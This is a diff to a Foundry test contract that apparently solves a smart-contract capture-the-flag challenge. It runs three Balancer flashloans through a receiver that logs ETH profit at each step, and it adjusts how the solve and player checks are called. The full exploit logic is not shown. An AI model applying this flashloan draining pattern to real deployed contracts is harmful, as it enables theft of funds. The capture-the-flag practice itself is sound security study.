@@ -137,15 +137,12 @@ contract Solve is Test{
                                                                 );
         bytes memory _data;
         _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
-        vm.expectRevert(abi.encodeWithSelector(Setup.Setup__Chall__Not__Solved.selector));
-        bool isSolved=chall_Setup.isSolved();
         vm.roll(1e18+1);
         _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
-        vm.expectRevert(abi.encodeWithSelector(Setup.Setup__Chall__Not__Solved.selector));
-        isSolved=chall_Setup.isSolved();
         vm.roll(1e18+2);
         _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
-        isSolved=chall_Setup.isSolved();
+        chall_Setup.setPlayer(address(_flashLoanReceiver));
+        bool isSolved=chall_Setup.isSolved();
         console.log(isSolved);
     }
 
@@ -260,8 +257,6 @@ contract FlashLoanReceiver is IFlashLoanRecipient {
             console.log("ETH PROFIT AFTER STEP2 :",address(this).balance - this_balance);
         }else{
             console.log("ETH PROFIT AFTER STEP3 :",address(this).balance - this_balance);
-            setup.solve();
-            console.log(setup.isSolved());
         }
         this_balance=address(this).balance;
     }
